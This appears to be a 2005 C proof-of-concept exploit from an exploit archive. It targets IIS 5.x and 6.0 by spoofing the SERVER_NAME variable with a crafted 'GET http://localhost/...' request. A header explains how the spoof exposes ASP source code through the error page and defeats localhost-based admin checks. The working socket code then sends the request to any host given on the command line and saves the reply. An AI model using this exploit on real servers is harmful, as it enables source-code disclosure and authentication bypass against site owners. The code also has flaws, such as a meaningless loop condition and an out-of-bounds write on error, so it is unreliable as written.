/*
====================================================================================
||  ##           #######  ##   ##    ##     #######   #######       ##    ##  ##  ||
||  ##           ##    ##  ## ##  ########  ##        ##         ######## ## ##   ||
||  ##     ##### ########   ###      ##     #######   #######       ##    ####    ||
||  ##           ##    ##   ##       ##     ##             ##  ###  ##    ## ##   ||
||  ######       #######    ##       ##     #######   #######  ###  ##    ##  ##  ||
====================================================================================

Name: IIS 5.x and IIS 6.0 Server Name Spoof PoC
File: IIS_5.x_and_IIS_6.0_Server_Name_Spoof.c
Description: Proof of concept
Author: Lympex
Contact:
+ Web: http://l-bytes.tk
+ Mail: lympex[at]gmail[dot]com
Date: 25/08/2005
Extra: Compiled with Visual C++ 6.0


################################################################################################################
#Remote IIS 5.x and IIS 6.0 Server Name Spoof
#
#It is possible to remotely spoof the "SERVER_NAME" Microsoft® Internet Information Server® 5.0, 5.1 and 6.0 
#server variable by doing a modified HTTP request. Thus potentially revealing sensitive ASP code through the 
#IIS 500-100.asp error page, the spoof also opens up a potential range of exploits in third party web 
#applications and web services.
#
#Technical Description
#Microsoft® IIS 5.x ® shows sensitive information if the "SERVER_NAME" IIS 5.x server variable is "localhost". 
#If a IIS 5.x ASP page has an error, the code on the fault line in the ASP page is shown in the browser, 
#but only if"SERVER_NAME" IIS server variable is "localhost". One can spoof the "SERVER_NAME" IIS server 
#variable so that it shows whatever one want. Other third party web applications or web services may also 
#be vulnerable if authentication depends on the validity this server variable. IIS 6.0 is vulnerable to the 
#spoof, but it's 500-100.asp page is not vulnerable.
#
#The IIS server variable that can be spoofed is the "SERVER_NAME", it can be accessed through 
#request.servervariables("SERVER_NAME") with ASP, and HttpContext.Current.Request.ServerVariables("SERVER_NAME") 
#with .NET, other programming languages have other methods to access this server variable, but are 
#equally vulnerable.
#
#If the HTTP request comes from a remote client, then the server variable "SERVER_NAME" returns the IP 
#address of the web server itself. If the HTTP request came from the same IP as the web server (thus the 
#request came from the an authenticated user browsing from the web server itself), then 
#request.servervariables("SERVER_NAME") returns "localhost". This fact is used as "proof" in web applications
#or web services that the person browsing the web server is in fact browsing from the web server itself. 
#The web applications or web services may use this proof to display an administrative interface to the web 
#browser user if such is the case. One exploitable example is the IIS 5.x 500-100.asp page(Note: the 
#IIS 6.0 500-100.asp page is no vulnerable); the page uses the server variable to determine if to display 
#the code where the error occurred.
#
#The technical description of the server variable is "The server's host name, DNS alias, or IP address as 
#it would appear in self-referencing URLs", it is therefore often used to determine the IP address of the 
#web server itself in once code, this opens up for a range of exploits including cookie-stealing, data 
#redirection, and other URL manipulation issues.
#
#There are many other applications that utilize validity of this server variable, and MSDN holds many 
#examples for developers that are easily exploitable with this bug; among the most serious are the 
#Microsoft® .NET Passport SDK examples, any web application or web service based on these examples are 
#probably vulnerable due to the bug.
################################################################################################################
*/

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")

//max size to socket buffer
#define LEN_BUF 2048
//socket status
#define Conectado 1868

void main(int argc, char *argv[])
{
	/*connect to a host throught a port*/
	int Conecta(char *Host, short puerto);
	//socket from the connection
	int socket;
	//to get the data received
	char buf[LEN_BUF];
	FILE *data;

	printf("\n                 Proof of Concept");
	printf("\n IIS 5.x and IIS 6.0 Server Name Spoof - by Lympex");
	printf("\nContact: lympex[at]gmail[dot]com - http://l-bytes.tk");
	printf("\n----------------------------------------------------\n");

	if(argc!=4)
	{
		printf("\n[+] Usage: %s server.com 80 /test.asp\n",argv[0]);return;
	}

	//conectamos
	socket=Conecta(argv[1],(short)atoi(argv[2]));

	if(socket==-1)
	{
		printf("\n[+] Error connecting to host\n");
		return;
	}printf("\n[+] Connected!\n");

	if((data=fopen("received_data.txt","w"))==NULL)
	{
		printf("\n[+] Error saving received data\n");
		WSACleanup();
		return;
	}

	/*send the EVIL REQUEST*/
	strcpy(buf,"GET http://localhost");strcat(buf,argv[3]);strcat(buf," HTTP/1.0\n\n");
	send(socket,buf,strlen(buf),0);

	//while we aren´t disconnected
	do
	{
		buf[recv(socket,buf,LEN_BUF,0)]='\0';
		fputs(buf,data);
	}while(socket==Conectado);

	WSACleanup();
	fclose(data);
	printf("\n[+] Received data, saved in: \x22received_data.txt\x22\n");
	return;
}

/*Connect to a host throught a port - by Lympex*/
int Conecta(char *Host, short puerto)
{
	/*para crear el socket*/
	WSADATA wsaData;
	SOCKET Winsock;//el que escucha
	/*estructura con los datos para realizar la conexion*/
	struct sockaddr_in Winsock_In;
	struct hostent *Ip;

	/*iniciamos el socket*/
	WSAStartup(MAKEWORD(2,2), &wsaData);
	/*asociamos*/
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
	
	//miramos si está correcto, y así no rellenamos la estructura Winsock_In para nada
	if(Winsock==INVALID_SOCKET)
	{
		/*salimos*/
		WSACleanup();
		return -1;
	}

	/*rellenamos la estructura*/
	Ip=gethostbyname(Host);
	Winsock_In.sin_port=htons(puerto);
	Winsock_In.sin_family=AF_INET;
	Winsock_In.sin_addr.s_addr=inet_addr(inet_ntoa(*((struct in_addr *)Ip->h_addr)));

	/*conectamos*/
	if(WSAConnect(Winsock,(SOCKADDR*)&Winsock_In,sizeof(Winsock_In),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
	{
		/*salimos*/
		WSACleanup();
		return -1;
	}

	return Winsock;
}

// milw0rm.com [2005-08-25]
